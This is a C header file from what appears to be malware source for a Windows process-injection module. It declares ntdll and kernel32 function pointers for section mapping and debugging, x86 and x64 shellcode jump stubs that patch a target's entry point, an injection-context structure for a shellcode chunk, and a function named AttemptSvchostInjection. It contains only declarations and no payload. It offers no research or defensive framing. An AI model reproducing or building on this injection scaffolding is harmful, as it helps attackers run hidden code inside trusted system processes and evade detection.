/*
	ProcessInjectMP.h
 Headers file

*/

#include <windows.h>
#include <winternl.h>

// some ntdll.h exctracts
typedef LONG		KPRIORITY;
typedef struct _PROCESS_BASIC_INFORMATION32
{
	NTSTATUS	ExitStatus;
	ULONG		PebBaseAddress;
	ULONG		AffinityMask;
	KPRIORITY	BasePriority;
	ULONG		uUniqueProcessId;
	ULONG		uInheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION32, *PPROCESS_BASIC_INFORMATION32;

typedef struct _PROCESS_BASIC_INFORMATION64
{
	NTSTATUS	ExitStatus;
	ULONG		Reserved0;
	ULONG64		PebBaseAddress;
	ULONG64		AffinityMask;
	LONG		BasePriority;
	ULONG		Reserved1;
	ULONG64		uUniqueProcessId;
	ULONG64		uInheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION64, *PPROCESS_BASIC_INFORMATION64;

/*
typedef struct _UNICODE_STRING 
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG			uLength;
	HANDLE			hRootDirectory;
	PUNICODE_STRING	pObjectName;
	ULONG			uAttributes;
	PVOID			pSecurityDescriptor;
	PVOID			pSecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;*/

#pragma pack(push)	// save structure pack settings
#pragma pack(1)		// remove alignment

typedef struct _ProcessInjectMPAPIs
{

	WORD wStrucSize;	// size of structure for integrity checking

	// ntdll.dll
	NTSTATUS (WINAPI *pi_ZwQueryInformationProcess) ( HANDLE hProcess, DWORD ProcessInformationClass, PVOID pProcessInformation, ULONG uProcessInformationLength,  PULONG puReturnLength);
	NTSTATUS (WINAPI *pi_ZwReadVirtualMemory) (	HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength );
	NTSTATUS (WINAPI *pi_ZwCreateSection) ( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER SectionSize, ULONG Protect, ULONG Attributes, HANDLE FileHandle);
	NTSTATUS (WINAPI *pi_ZwMapViewOfSection) ( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect );
	NTSTATUS (WINAPI *pi_ZwUnmapViewOfSection) ( HANDLE hProcess, PVOID pBaseAddress );

	// kernel32.dll
	BOOL (WINAPI *pi_DebugActiveProcess) ( DWORD dwProcessId );
	BOOL (WINAPI *pi_DebugActiveProcessStop) ( DWORD dwProcessId );
	BOOL (WINAPI *pi_CreateProcessW) ( LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation );
	BOOL (WINAPI *pi_DebugSetProcessKillOnExit) ( BOOL KillOnExit );
	DWORD (WINAPI *pi_ResumeThread) ( HANDLE hThread );
	UINT (WINAPI *pi_GetSystemDirectoryW) ( LPWSTR lpBuffer, UINT uSize );

} ProcessInjectMPAPIs, *PProcessInjectMPAPIs;

#if defined(_M_X64)

	// x64 shellcode entry EP patch struct
	typedef struct _JumpCode
	{
		WORD wMovRcxOpcode;		// param
		ULONGLONG ulParam;
		
		WORD wMovRaxOpcode;		// jump addr
		ULONGLONG ulExecAddr;

		WORD wJmpRaxOpcode;

	} JumpCode, *PJumpCode;
#else

	// x32 shellcode entry EP patch struct
	typedef struct _JumpCode
	{
		BYTE bPushOpcode1;	// param 
		DWORD dwPushArg1;

		BYTE bPushOpcode2;	// pseudo-ret addr
		DWORD dwPushArg2;

		BYTE bPushOpcode3;	// ret addr
		DWORD dwPushArg3;

		BYTE bRetOpcode;

	} JumpCode, *PJumpCode;

#endif

#pragma pack(pop)	// restore previous alignment settings


// structure describing in-out params for main function
typedef struct _INJECT_CONTEXT
{
	// input params
	LPVOID pInjectionChunk;	// solid chunk to be injected to remote process (shellcode + context + extra data)
	DWORD lInjectionChunkLen;	// it's len

	DWORD lShellcodeEntryOffset;	// offset where shellcode's entrypoint resides, relative to start of pInjectionChunk buffer (to make a correct jmp instruction)

	// output params
	HANDLE hTargetProcess;		// handle to an injected process, should be used/closed by caller
	LPVOID pRemoteImage_EP;		// used internally, local ptr to a locally mapped section, which replaces remote exe's entrypoint

} INJECT_CONTEXT, *PINJECT_CONTEXT;


BOOL AttemptSvchostInjection(INJECT_CONTEXT *ic);

